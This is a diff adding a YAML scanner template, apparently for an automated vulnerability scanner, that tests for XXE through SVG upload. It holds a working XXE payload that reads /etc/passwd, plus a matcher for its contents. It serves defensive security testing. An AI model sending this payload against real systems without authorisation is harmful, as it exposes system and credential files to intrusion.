@@ -1,0 +1,19 @@
+id: patt-xxe-svg-01-xml
+name: 'PATT xxe patt-xxe-svg-01 via xml'
+severity: critical
+type: active
+tags:
+  - xxe
+  - patt
+description: 'PATT XXE via upload SVG. [patt:patt-xxe-svg-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XXE%20Injection/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      xml:
+        - '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
